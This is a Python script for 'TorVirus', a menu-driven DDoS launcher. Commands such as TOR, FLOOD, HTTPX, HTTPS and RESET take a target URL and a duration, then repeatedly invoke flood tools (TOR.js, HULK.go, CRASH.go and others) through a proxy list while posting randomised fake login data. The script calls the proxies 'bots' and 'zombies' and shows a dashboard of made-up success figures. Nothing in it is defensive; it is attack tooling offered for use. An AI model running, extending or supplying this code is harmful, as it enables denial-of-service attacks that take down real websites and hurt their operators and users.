import os as o, time as t, sys as s, random as r

# Display a progress bar
def progress(current, total, bar_length=30):
    filled_length = int(bar_length * current // total)
    bar = '█' * filled_length + '-' * (bar_length - filled_length)
    return f"[{bar}] {current}/{total}"

# Clear the console
def clear_console():
    o.system('cls' if o.name == 'nt' else 'clear')

# Load proxies from a file
def load_proxies(file_path='proxy.txt'):
    try:
        with open(file_path, 'r') as file:
            for line in file:
                proxy = line.strip()
                if proxy:
                    yield proxy
    except FileNotFoundError:
        print(f"⚠️  Error: {file_path} not found. Proxy connection aborted.")
        s.exit(1)

# Display dashboard with system stats
def display_dashboard():
    uptime_seconds = int(t.time() - session_start)
    minutes, seconds = divmod(uptime_seconds, 60)
    print(f'''
    🖥️  TorVirus DASHBOARD 🖥️
    | 🛰️  Bots Online: {bot_count}
    | ⏳ Uptime: {minutes}m {seconds}s
    | 📈 Success Rate: {r.randint(85, 99)}%
    | 🔗 Network Strength: {r.choice(["Strong", "Moderate", "Weak"])}
    | ⚠️  Threat Level: {r.choice(["🟢 Low", "🟡 Medium", "🔴 High"])}
    ''')

# Matrix-style loading effect
def matrix_effect(duration=3):
    start = t.time()
    while t.time() - start < duration:
        print(''.join(r.choice('01 ') for _ in range(80)))
        t.sleep(0.1)

# Welcome message with animations
def welcome_message(bot_count, session_time):
    title = "🚨 WELCOME TO TORVIRUS 🚨"
    info = f"| 🔐 Zombies: {bot_count} | Session: {session_time:.2f}s | 🌐 Tor✅"
    clear_console()
    matrix_effect(2)
    clear_console()
    print(f"{title}\n{info}\n")

# Show main menu
def display_menu():
    clear_console()
    welcome_message(bot_count, session_duration())
    print('''  
  _____      __   ___
 |_   _|__ _ \ \ / (_)_ _ _  _ ___
   | |/ _ \ '_\ V /| | '_| || (_-<
   |_|\___/_|  \_/ |_|_|  \_,_/__/ 
   
    🚨  LAYER7 ATTACK METHODS MENU  🚨
         (Top-secret Protocols)

    !TOR     - Launch TOR-based DDoS
      Usage: TOR https://example.com 60
''')

# Loading animation
def loading_animation(task, duration=1.5):
    frames = ['◐', '◓', '◑', '◒']
    start = t.time()
    index = 0
    while t.time() - start < duration:
        print(f'\r{task} {frames[index % len(frames)]}', end='', flush=True)
        t.sleep(0.15)
        index += 1
    print('\r', end='')

# Typing effect for cool text output
def animated_text(text, delay=0.05, end_line=True):
    for char in text:
        s.stdout.write(char)
        s.stdout.flush()
        t.sleep(delay)
    if end_line:
        print()

# Random task text
def random_task_text():
    messages = [
        "🌐 Establishing Encrypted TOR Network Tunnels...",
        "🌀 Tuning Low-Latency High-Speed Proxies...",
    ]
    selected_text = r.choice(messages)
    loading_animation("Processing", 1.5)
    animated_text(selected_text)

# Session duration calculation
def session_duration():
    return t.time() - session_start

# Main loop to handle commands
def main_loop():
    display_menu()
    while True:
        user_input = input("root@torvirus#~ ").strip()
        if not user_input:
            continue
        parts = user_input.split()
        command = parts[0].upper()
        
        if command == "STATS":
            clear_console()
            display_dashboard()
            continue
        elif command in ["CLEAR", "CLS"]:
            loading_animation("Purging Console", 1.5)
            display_menu()
        elif command == "TOR":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                animated_text(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(f'node .TorCache/.TorOdd/TOR.js GET "{host}" {max_time} 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                    o.system(f'node .TorCache/.TorOdd/TOR.js POST "{host}" {max_time} 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                    t.sleep(1)

            except IndexError:
                print('❌ Invalid Command. Usage: METHOD URL TIME')
                print('Example: TOR https://example.com 60')

        elif command == "FLOOD":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                animated_text(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(f'go run .TorCache/.TorOdd/HULK.go --site {host} --data GET')
                    o.system(f'go run .TorCache/.TorOdd/CRASH.go {host} 9999 get {max_time} nil')
                    t.sleep(1)

            except IndexError:
                print('❌ Invalid Command. Usage: METHOD URL TIME')
                print('Example: TOR https://example.com 60')

        elif command == "HTTPX":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                animated_text(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(f'node .TorCache/.TorOdd/HTTPX.js {host} {max_time} 8 8 proxy.txt')
                    o.system(f'node .TorCache/.TorOdd/HTTPZ.js {host} {max_time} 8 8 proxy.txt')
                    t.sleep(1)

            except IndexError:
                print('❌ Invalid Command. Usage: METHOD URL TIME')
                print('Example: TOR https://example.com 60')

        elif command == "HTTPS":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                animated_text(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(f'node .TorCache/.TorOdd/HTTPS.js POST {host} {max_time} 8 8 proxy.txt')
                    o.system(f'node .TorCache/.TorOdd/HTPPSV2.js GET {host} {max_time} 8 8 proxy.txt')

                    t.sleep(1)

            except IndexError:
                print('❌ Invalid Command. Usage: METHOD URL TIME')
                print('Example: TOR https://example.com 60')

        elif command == "RESET":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                animated_text(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(f'node .TorCache/.TorOdd/RESETV2.js {host} {max_time} 8 8 proxy.txt --full')
                    o.system(f'node .TorCache/.TorOdd/RESET.js {host} {max_time} 8 8 proxy.txt')
                    t.sleep(1)

            except IndexError:
                print('❌ Invalid Command. Usage: METHOD URL TIME')
                print('Example: TOR https://example.com 60')

        elif command == "PROXY":
            o.system('python3 .TorCache/.TorOdd/proxy.py &')
            continue

        elif command == "SETUP":
            o.system('sudo bash setup.sh &')
            continue

        elif command == "HELP":
            loading_animation("Loading Help Interface", 1.5)
            print('''
HELP - For Assistance
CLEAR - Clear Terminal
''')

        else:
            print(f"❌ Command [ {command} ] not recognized. Please try again! 🚨")

# Connection initiation
def connect_network():
    animated_text("🔌 Connecting to the TorVirus Network...", 0.02)
    random_task_text()

# Initialize session start time and proxy data
session_start = t.time()
proxies = list(load_proxies())
bot_count = len(proxies)

# Run the application
clear_console()
connect_network()
try:
    main_loop()
finally:
    pass
